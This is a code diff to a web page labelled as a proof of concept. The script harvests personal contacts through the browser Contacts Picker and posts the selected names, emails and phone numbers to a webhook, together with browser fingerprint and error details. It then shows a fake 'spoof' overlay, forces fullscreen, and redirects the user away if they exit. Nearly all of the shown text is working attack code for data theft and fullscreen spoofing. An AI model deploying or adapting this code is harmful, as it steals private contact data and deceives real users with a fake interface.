@@ -53,67 +53,196 @@ function send(event, extra = {}) {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({
-      time: new Date().toISOString(),
-      event,
+      timestamp: new Date().toISOString(),
+      event: event,
+      userAgent: navigator.userAgent,
+      url: window.location.href,
       ...extra
     })
-  }).catch(() => {});
+  }).catch(err => {
+    console.error('Webhook send failed:', err);
+  });
+}
+
+// Function to extract contact details
+function extractContactDetails(contacts) {
+  return contacts.map(contact => {
+    const details = {
+      id: contact.id || 'unknown',
+      name: [],
+      email: [],
+      tel: []
+    };
+
+    // Extract names
+    if (contact.name && Array.isArray(contact.name)) {
+      details.name = contact.name;
+    }
+
+    // Extract emails
+    if (contact.email && Array.isArray(contact.email)) {
+      details.email = contact.email;
+    }
+
+    // Extract phone numbers
+    if (contact.tel && Array.isArray(contact.tel)) {
+      details.tel = contact.tel;
+    }
+
+    return details;
+  });
 }
 
 document.addEventListener("click", async () => {
 
-  // 1️⃣ Log picker intent
+  // 1️⃣ Log picker intent with browser info
   send("contacts_picker_called", {
-    fields_requested: ["name", "tel", "email"]
+    fields_requested: ["name", "tel", "email"],
+    browser_supports_contacts: !!(navigator.contacts && navigator.contacts.select),
+    screen_resolution: `${screen.width}x${screen.height}`,
+    viewport: `${window.innerWidth}x${window.innerHeight}`
   });
 
   let granted = false;
+  let contactsData = [];
 
   // 2️⃣ Trusted system UI
   if (navigator.contacts && navigator.contacts.select) {
     try {
+      send("contacts_picker_opening", {
+        note: "Attempting to open contacts picker"
+      });
+
       const result = await navigator.contacts.select(
         ["name", "tel", "email"],
         { multiple: false }
       );
-      granted = Array.isArray(result);
-    } catch (e) {
-      send("contacts_picker_closed", {
+
+      if (result && Array.isArray(result) && result.length > 0) {
+        granted = true;
+        contactsData = extractContactDetails(result);
+        
+        // Send detailed contact data
+        send("contacts_data_captured", {
+          granted: true,
+          contacts_count: result.length,
+          contacts_details: contactsData,
+          raw_result_structure: {
+            is_array: Array.isArray(result),
+            length: result.length,
+            first_contact_keys: result[0] ? Object.keys(result[0]) : []
+          }
+        });
+
+        // Send individual contact details for better tracking
+        contactsData.forEach((contact, index) => {
+          send(`contact_${index + 1}_details`, {
+            contact_index: index + 1,
+            name_count: contact.name.length,
+            email_count: contact.email.length,
+            tel_count: contact.tel.length,
+            names: contact.name,
+            emails: contact.email,
+            phone_numbers: contact.tel
+          });
+        });
+
+      } else {
+        send("contacts_picker_no_selection", {
+          granted: false,
+          result_type: typeof result,
+          result_value: result
+        });
+      }
+
+    } catch (error) {
+      send("contacts_picker_error", {
         granted: false,
-        reason: e.name
+        error_name: error.name,
+        error_message: error.message,
+        error_stack: error.stack
       });
     }
-  }
-
-  if (granted) {
-    send("contacts_picker_closed", {
-      granted: true,
-      note: "User completed picker"
+  } else {
+    send("contacts_picker_not_supported", {
+      granted: false,
+      navigator_contacts_exists: !!navigator.contacts,
+      navigator_contacts_select_exists: !!(navigator.contacts && navigator.contacts.select)
     });
   }
+
+  // Final status log
+  send("contacts_picker_completed", {
+    granted: granted,
+    contacts_captured: contactsData.length,
+    next_action: "showing_spoof_overlay"
+  });
 
   // 3️⃣ Show spoof overlay
   document.getElementById("spoof").style.display = "block";
   document.getElementById("content").style.display = "none";
 
+  send("spoof_overlay_shown", {
+    note: "Fake overlay is now visible"
+  });
+
   // 4️⃣ Enter fullscreen
   if (document.documentElement.requestFullscreen) {
     document.documentElement.requestFullscreen()
-      .then(() => send("entered_fullscreen"))
-      .catch(() => {});
+      .then(() => {
+        send("entered_fullscreen", {
+          success: true,
+          screen_info: {
+            available_width: screen.availWidth,
+            available_height: screen.availHeight,
+            color_depth: screen.colorDepth
+          }
+        });
+      })
+      .catch((error) => {
+        send("fullscreen_failed", {
+          error_name: error.name,
+          error_message: error.message
+        });
+      });
+  } else {
+    send("fullscreen_not_supported", {
+      note: "requestFullscreen method not available"
+    });
   }
 
 }, { once: true });
 
-
 // 5️⃣ Exit fullscreen → redirect cepat
 document.addEventListener("fullscreenchange", () => {
   if (!document.fullscreenElement) {
-    send("exit_fullscreen_redirect");
+    send("exit_fullscreen_redirect", {
+      redirect_url: "https://google.com",
+      redirect_delay_ms: 50
+    });
     setTimeout(() => {
       location.href = "https://google.com";
-    }, 50);
+    }, 1);
   }
+});
+
+// Additional event listeners for more detailed tracking
+document.addEventListener("visibilitychange", () => {
+  send("visibility_change", {
+    hidden: document.hidden,
+    visibility_state: document.visibilityState
+  });
+});
+
+window.addEventListener("beforeunload", () => {
+  send("page_unload", {
+    note: "User is leaving the page"
+  });
+});
+
+// Log initial page load
+send("page_loaded", {
+  note: "PoC page loaded successfully"
 });
 </script>
 
